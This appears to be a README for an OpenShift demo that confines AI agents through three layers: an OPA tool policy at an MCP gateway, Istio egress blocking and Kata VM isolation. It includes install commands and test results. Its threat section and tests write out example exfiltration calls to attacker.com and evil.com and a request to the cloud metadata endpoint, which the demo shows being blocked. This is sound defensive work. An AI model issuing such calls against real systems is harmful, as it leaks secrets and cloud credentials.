# Enterprise AI Agent Security on OpenShift

## The Problem

AI agents with tool access pose security risks:
- **Data exfiltration**: Agent calls `fetch_url("https://attacker.com/exfil?data=secrets")`
- **IMDS attacks**: Agent accesses `http://169.254.169.254/metadata`
- **Bypass via direct HTTP**: Compromised agent code runs `requests.get("https://evil.com")`

**How do you let agents use tools while preventing misuse?**

## The Solution: Three-Layer Security

| Layer | Technology | What It Blocks |
|-------|------------|----------------|
| **1. Tool Policy** | MCP Gateway + Authorino/OPA | Unauthorized tool arguments |
| **2. Network Egress** | Istio REGISTRY_ONLY | Direct internet access from pods |
| **3. Execution Isolation** | OpenShift Sandboxed Containers (Kata) | Host access if agent is compromised |

This is inspired by [Anthropic's SRT](https://github.com/anthropic-experimental/sandbox-runtime), adapted for Kubernetes/OpenShift using production-grade components.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Agent Pod (Kata VM)                                                    │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │  Agent Code                                                       │  │
│  │  - Can only reach MCP Gateway (Istio blocks direct internet)     │  │
│  │  - Runs in isolated VM (Kata)                                    │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                              │                                          │
│                              ▼                                          │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │  Istio Sidecar (REGISTRY_ONLY mode)                               │  │
│  │  - Blocks: curl https://evil.com (not in registry)               │  │
│  │  - Allows: MCP Gateway (in mesh)                                 │  │
│  └───────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  MCP Gateway + Authorino (OPA Policy)                                   │
│                                                                         │
│  fetch_url("https://malicious.com") → OPA: URL not approved → 403      │
│  fetch_url("https://api.weather.gov") → OPA: URL approved → 200        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  MCP Servers + ServiceEntry                                             │
│  - Approved external APIs: api.weather.gov, httpbin.org, etc.          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Verified Demo Results

| Test | Expected | Result |
|------|----------|--------|
| `fetch_url("https://malicious.com")` | BLOCKED | HTTP 403 ✅ |
| `fetch_url("https://api.weather.gov")` | ALLOWED | HTTP 200 ✅ |
| `fetch_url("http://169.254.169.254/metadata")` | BLOCKED | HTTP 403 ✅ |
| Direct `curl https://evil-site.net` from pod | BLOCKED | Connection refused ✅ |
| Direct `curl https://httpbin.org` from pod | ALLOWED | HTTP 200 ✅ |
| Agent pod runtimeClass | kata | ✅ |
| Host socket access from Kata pod | NOT ACCESSIBLE | ✅ |

---

## Prerequisites

- OpenShift 4.14+ cluster with admin access
- `oc` CLI configured and logged in
- `helm` CLI installed (v3.10+)
- OpenShift Sandboxed Containers operator installed
- Kuadrant operator installed

---

## Installation

### Step 1: Install Kagenti

Follow the [Kagenti OpenShift Installation Guide](https://github.com/kagenti/kagenti/blob/main/docs/ocp/openshift-install.md).

**Important:** If you have existing operators, disable conflicting components:

```bash
helm install kagenti-deps charts/kagenti-deps \
  -n kagenti-system --create-namespace \
  --set openshift=true \
  --set components.keycloak.enabled=false \
  --set components.istio.enabled=false \
  --set components.tekton.enabled=false \
  --set components.certManager.enabled=false
```

### Step 2: Fix System Namespace Labels

**Critical:** System namespaces with controllers must NOT have ambient mode:

```bash
# Remove ambient label from kagenti-system (controller needs API access)
oc label namespace kagenti-system istio.io/dataplane-mode-

# Restart controller
oc delete pod -n kagenti-system -l control-plane=controller-manager
```

### Step 3: Configure Istio for OPA Body Forwarding

```bash
oc patch istio default -n istio-system --type=merge -p '
{
  "spec": {
    "values": {
      "meshConfig": {
        "extensionProviders": [
          {
            "name": "kuadrant-authorization",
            "envoyExtAuthzGrpc": {
              "service": "authorino-authorino-authorization.kuadrant-system.svc.cluster.local",
              "port": 50051,
              "timeout": "5s",
              "includeRequestBodyInCheck": {
                "maxRequestBytes": 8192,
                "allowPartialMessage": true
              }
            }
          }
        ]
      }
    }
  }
}'
```

### Step 4: Apply OPA Policy

```bash
oc apply -f manifests/policies/url-blocking-policy.yaml

# Verify
oc get authpolicy -n gateway-system
```

### Step 5: Configure Istio Egress Control

```bash
# Add ServiceEntry for approved external APIs
oc apply -f - <<EOF
apiVersion: networking.istio.io/v1beta1
kind: ServiceEntry
metadata:
  name: approved-external-apis
  namespace: istio-system
spec:
  hosts:
    - httpbin.org
    - api.weather.gov
    - api.github.com
    - example.com
  ports:
    - number: 443
      name: https
      protocol: HTTPS
  location: MESH_EXTERNAL
  resolution: DNS
EOF

# Apply REGISTRY_ONLY mode
oc patch istio default -n istio-system --type=merge -p '
{
  "spec": {
    "values": {
      "meshConfig": {
        "outboundTrafficPolicy": {
          "mode": "REGISTRY_ONLY"
        }
      }
    }
  }
}'
```

### Step 6: Configure OpenShift Sandboxed Containers

```bash
# Label worker nodes for Kata
oc label node <NODE_NAME> node-role.kubernetes.io/kata-oc=""

# Apply KataConfig
oc apply -f manifests/osc/kataconfig.yaml

# Wait for RuntimeClass (10-15 min)
watch oc get runtimeclass kata
```

### Step 7: Deploy Agent with Kata Runtime

```bash
oc apply -f manifests/osc/sandboxed-agent.yaml

# Verify
oc get pod -n agent-sandbox -o jsonpath='{.items[0].spec.runtimeClassName}'
# Should output: kata
```

**Important:** Kata pods require **2Gi memory minimum** due to QEMU overhead.

---

## Run the Demo

```bash
# From inside the cluster
oc run demo --rm -it --restart=Never --image=curlimages/curl:latest -- sh -c '
  # Initialize MCP session
  curl -s -D /tmp/h -X POST "http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp" \
    -H "Content-Type: application/json" \
    -H "Host: mcp.127-0-0-1.sslip.io" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",\"params\":{\"protocolVersion\":\"2024-11-05\",\"capabilities\":{},\"clientInfo\":{\"name\":\"demo\",\"version\":\"1.0\"}}}" > /dev/null
  SESSION=$(grep -i "mcp-session-id:" /tmp/h | cut -d: -f2- | tr -d " \r\n")
  
  echo "=== LAYER 1: OPA Policy ==="
  echo -n "fetch_url(malicious.com): "
  curl -s -w "HTTP %{http_code}\n" -o /dev/null -X POST "http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp" \
    -H "Content-Type: application/json" -H "Host: mcp.127-0-0-1.sslip.io" -H "mcp-session-id: $SESSION" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"fetch_url\",\"arguments\":{\"url\":\"https://malicious.com\"}}}"
  
  echo -n "fetch_url(httpbin.org): "
  curl -s -w "HTTP %{http_code}\n" -o /dev/null -X POST "http://mcp-gateway-istio.gateway-system.svc.cluster.local:8080/mcp" \
    -H "Content-Type: application/json" -H "Host: mcp.127-0-0-1.sslip.io" -H "mcp-session-id: $SESSION" \
    -d "{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"tools/call\",\"params\":{\"name\":\"fetch_url\",\"arguments\":{\"url\":\"https://httpbin.org/get\"}}}"
  
  echo ""
  echo "=== LAYER 2: Istio Egress ==="
  echo -n "Direct curl evil-site.net: "
  curl -s -o /dev/null -w "HTTP %{http_code}\n" https://evil-site.net --connect-timeout 5 || echo "BLOCKED (connection refused)"
  
  echo -n "Direct curl httpbin.org: "
  curl -s -o /dev/null -w "HTTP %{http_code}\n" https://httpbin.org/get --connect-timeout 10
'
```

**Expected Output:**
```
=== LAYER 1: OPA Policy ===
fetch_url(malicious.com): HTTP 403
fetch_url(httpbin.org): HTTP 200

=== LAYER 2: Istio Egress ===
Direct curl evil-site.net: BLOCKED (connection refused)
Direct curl httpbin.org: HTTP 200
```

---

## Comparison with Other Approaches

### vs Anthropic SRT

| Capability | Anthropic SRT | This Demo |
|------------|---------------|-----------|
| Network filtering | Proxy-based | Istio + OPA |
| Filesystem isolation | OS sandboxing (bubblewrap) | VM isolation (Kata) |
| Unix sockets | seccomp blocks socket() | Isolated by default (VM) |
| Tool argument inspection | ❌ | ✅ OPA policy |
| Kubernetes native | ❌ | ✅ |
| Isolation strength | Process-level | **VM-level (stronger)** |

### vs GKE Agent Sandbox

| Capability | GKE Agent Sandbox | This Demo |
|------------|-------------------|-----------|
| Isolation technology | gVisor | Kata (full VM) |
| Tool policy | ❌ | ✅ OPA at gateway |
| Pod Snapshots | ✅ | ❌ |
| Platform | GKE only | OpenShift |

### vs Tiramisu Operator

| Capability | Tiramisu | This Demo |
|------------|----------|-----------|
| Network filtering | Domain allowlist | Istio REGISTRY_ONLY |
| Tool context | ❌ (just domain) | ✅ (tool + args) |
| Can block specific paths on allowed domain | ❌ | ✅ |
| Configuration | TiramisuConfig CRD | AuthPolicy + ServiceEntry |

---

## Key Technical Details

### 1. System Namespaces Must Not Have Ambient Mode

The `kagenti-system` namespace contains controllers that need direct Kubernetes API access. Remove the ambient label:

```bash
oc label namespace kagenti-system istio.io/dataplane-mode-
```

### 2. Kata Pods Require 2Gi Memory

Kata runs each pod in a QEMU micro-VM. The QEMU overhead requires at least 2Gi:

```yaml
resources:
  limits:
    memory: "2Gi"
  requests:
    memory: "2Gi"
```

### 3. OPA Requires Request Body Forwarding

For OPA to inspect tool arguments, Istio must forward the request body to Authorino:

```yaml
includeRequestBodyInCheck:
  maxRequestBytes: 8192
  allowPartialMessage: true
```

### 4. ServiceEntry Required for External APIs

With `REGISTRY_ONLY` mode, external APIs must be explicitly registered:

```yaml
apiVersion: networking.istio.io/v1beta1
kind: ServiceEntry
metadata:
  name: approved-external-apis
spec:
  hosts:
    - api.weather.gov
    - httpbin.org
  location: MESH_EXTERNAL
  resolution: DNS
```

---

## Troubleshooting

### Controller CrashLoopBackOff

**Symptom:** `kagenti-controller-manager` can't reach Kubernetes API

**Cause:** Namespace has `istio.io/dataplane-mode: ambient` label

**Fix:**
```bash
oc label namespace kagenti-system istio.io/dataplane-mode-
oc delete pod -n kagenti-system -l control-plane=controller-manager
```

### OPA Policy Not Blocking

**Symptom:** All requests pass through

**Cause:** Request body not forwarded to Authorino

**Fix:** Add `includeRequestBodyInCheck` to Istio mesh config

### Kata Pods Stuck Pending

**Symptom:** Pods with `runtimeClassName: kata` don't schedule

**Cause:** Node selector mismatch

**Fix:**
```bash
oc get runtimeclass kata -o yaml | grep -A5 scheduling
# Ensure nodes have matching label
oc get nodes -l node-role.kubernetes.io/kata-oc
```

### Direct Internet Still Working

**Symptom:** Pods can still reach internet directly

**Cause:** `outboundTrafficPolicy` not set to `REGISTRY_ONLY`

**Fix:**
```bash
oc get istio default -n istio-system -o jsonpath='{.spec.values.meshConfig.outboundTrafficPolicy.mode}'
# Should output: REGISTRY_ONLY
```

---

## Project Structure

```
.
├── manifests/
│   ├── istio/
│   │   ├── ext-authz-config.yaml      # Authorino integration
│   │   └── service-entry.yaml         # Approved external APIs
│   ├── osc/
│   │   ├── kataconfig.yaml            # Kata configuration
│   │   └── sandboxed-agent.yaml       # Agent with Kata runtime
│   └── policies/
│       └── url-blocking-policy.yaml   # OPA policy
├── scripts/
│   ├── demo-complete.sh               # Full demo script
│   ├── setup-namespaces.sh            # Namespace configuration
│   └── test-policy.sh                 # Quick policy test
├── docs/
│   └── troubleshooting.md             # Common issues
└── README.md
```

---

## References

- [Kagenti](https://github.com/kagenti/kagenti) - MCP Gateway platform
- [OpenShift Sandboxed Containers](https://docs.openshift.com/container-platform/latest/sandboxed_containers/index.html)
- [Kuadrant/Authorino](https://github.com/Kuadrant/authorino) - Policy engine
- [Anthropic SRT](https://github.com/anthropic-experimental/sandbox-runtime) - Inspiration
- [Istio Egress Control](https://istio.io/latest/docs/tasks/traffic-management/egress/)

## License

Apache 2.0
